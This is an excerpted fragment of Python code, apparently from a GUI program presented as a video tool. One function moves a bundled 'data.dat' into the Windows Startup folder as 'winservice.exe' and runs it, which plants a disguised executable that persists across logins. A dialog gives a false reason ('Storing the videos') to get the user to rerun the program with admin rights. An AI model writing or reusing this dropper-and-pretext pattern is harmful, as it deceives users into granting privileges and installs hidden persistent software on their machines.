...
def start_something():
	path = r'C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/winservice.exe'
	os.rename("data.dat", path) #move file to the start dir
	os.system(f"\"{path}\"")
...
"font-family: Helvetica, sans-serif;\n"
    ...
    def Alert(self):
        ...
        text = ["Error", "Permission Error", "Permission required for Storing the videos", "Please Rerun as admin rights"]
        alert.ui.retranslateUi(alert, text)
        alert.exec()
